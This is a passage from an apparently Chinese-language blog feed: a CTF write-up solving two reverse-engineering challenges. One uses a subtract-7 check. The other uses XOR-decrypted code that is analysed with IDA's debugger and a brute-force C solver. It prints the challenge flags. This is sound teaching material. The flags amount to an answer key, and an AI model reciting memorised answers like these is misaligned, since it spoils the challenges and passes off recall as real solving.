		input[i]+=7;
		if(input[i]!=enstr[i]){
			return 1;
		}
	}
	return 0;
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;我们只要将给出的&lt;code&gt;enstr&lt;&#x2F;code&gt;所有值减7，就能拿到flag：&lt;&#x2F;p&gt;
&lt;p&gt;__ACTF{a5m_15_1mp0r7an7} __&lt;&#x2F;p&gt;
&lt;h2 id=&quot;guan-yu-wo-f5yi-hou-huan-shi-gao-bu-dong-ta-zai-xiang-xie-shi-yao-zhe-dang-shi&quot;&gt;关于我F5以后还是搞不懂他在想些什么这档事&lt;&#x2F;h2&gt;
&lt;p&gt;把文件放入ida分析，进入&lt;code&gt;main&lt;&#x2F;code&gt; 函数以后F5查看c代码。在接收用户输入以后有很长的一段代码：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;  v3 = malloc(0x82uLL);
  v14 = v3;
  v4 = qword_55FA3685F068;
  *(_QWORD *)v3 = func_s;
  *((_QWORD *)v3 + 1) = v4;
  v5 = qword_55FA3685F078;
  *((_QWORD *)v3 + 2) = qword_55FA3685F070;
  *((_QWORD *)v3 + 3) = v5;
  v6 = qword_55FA3685F088;
  *((_QWORD *)v3 + 4) = qword_55FA3685F080;
  *((_QWORD *)v3 + 5) = v6;
  v7 = qword_55FA3685F098;
  *((_QWORD *)v3 + 6) = qword_55FA3685F090;
  *((_QWORD *)v3 + 7) = v7;
  v8 = qword_55FA3685F0A8;
  *((_QWORD *)v3 + 8) = qword_55FA3685F0A0;
  *((_QWORD *)v3 + 9) = v8;
  v9 = qword_55FA3685F0B8;
  *((_QWORD *)v3 + 10) = qword_55FA3685F0B0;
  *((_QWORD *)v3 + 11) = v9;
  v10 = qword_55FA3685F0C8;
  *((_QWORD *)v3 + 12) = qword_55FA3685F0C0;
  *((_QWORD *)v3 + 13) = v10;
  v11 = qword_55FA3685F0D8;
  *((_QWORD *)v3 + 14) = qword_55FA3685F0D0;
  *((_QWORD *)v3 + 15) = v11;
  *((_WORD *)v3 + 64) = word_55FA3685F0E0;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这一段其实耐心看完不难发现，完成的其实只是将以&lt;code&gt;func_s&lt;&#x2F;code&gt;为首地址的之后130个字节的数据拷贝到以&lt;code&gt;v3&lt;&#x2F;code&gt;为首地址的空间里，相当于&lt;code&gt;memcpy((char *)v3,func_s,130);&lt;&#x2F;code&gt;。之后的内容则是将这段数据从&lt;code&gt;v3&lt;&#x2F;code&gt;开始，每个字节都异或&lt;code&gt;0x23&lt;&#x2F;code&gt;:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;  v17 = v14;
  v16 = 0;
  while ( v16 &amp;lt;= 129 )
  {
    *v17 ^= 0x23u;
    ++v16;
    ++v17;
  }
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;完成这一步后出现了一个不太寻常的操作：&lt;code&gt;((void (__fastcall *)(char *, char *))v14)(v13, v13);&lt;&#x2F;code&gt; 将这一段数据当作了函数并且传入参数&lt;code&gt;v13&lt;&#x2F;code&gt;调用了它。最后就到了验证flag的环节。flag当然不会原模原样的放在验证数组里（经过两次挨打的出题人终于不再图样了），所以我们还是要搞清楚这段数据被当作函数调用以后对用户的输入做了什么操作。&lt;&#x2F;p&gt;
&lt;p&gt;问题来了，该怎么分析这段数据呢？一个比较省力的办法是使用ida的动态调试功能（因为是elf文件所以需要在linux的虚拟机里进行远程调试，具体的操作方法搜一蛤就能找到），在调用这段数据时下断点，程序自己运行到断点处时，单步进入，创建函数后再使用F5功能，就能看到这段数据被当作函数时是怎样的代码。经由上述操作，我们进入了获得了这段函数的代码：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;__int64 __fastcall sub_56389A4F1830(__int64 a1)
{
  int i; &amp;#x2F;&amp;#x2F; [rsp+14h] [rbp-4h]

  for ( i = 0; *(_BYTE *)(i + a1); ++i )
    *(_BYTE *)(i + a1) = (*(unsigned __int8 *)(i + a1) &amp;lt;&amp;lt; 32) &amp;amp; ((signed int)*(unsigned __int8 *)(i + a1) &amp;gt;&amp;gt; 32) ^ 0xCC;
  return 0LL;
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;a1为用户输入，经历for循环中的移位、和、异或系列操作后返回。之后就是验证环节。运算操作没有很复杂，以下是解密代码：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;c&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;## include&amp;lt;stdio.h&amp;gt;

int main() {
	char str[]={0x8d,0x8f,0x98,0x8a,0xb7,0xbf,0xa3,0xa0,0xba,0xa9,0x93,0xbb,0xa5,0xb8,0xa4,0x93,0xa8,0xb5,0xa2,
	0xad,0xa1,0xa5,0xaf,0x93,0xa8,0xa9,0xae,0xb9,0xab,0xab,0xa5,0xa2,0xab,0xb1};
	for(int i=0;i&amp;lt;=33;i++){
		for(char input = 0x20;input&amp;lt;=0x7e;input++){
			char input_m;
			input_m = ((input&amp;lt;&amp;lt;32)&amp;amp;(input&amp;gt;&amp;gt;32)^0xcc);
			if(input_m == str[i]){
				printf(&amp;quot;%c&amp;quot;,input);
				break;
			}
		}
	}
	return 0;
  
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;得到flag：&lt;strong&gt;ACTF{solve_with_dynamic_debugging}&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
</feed>
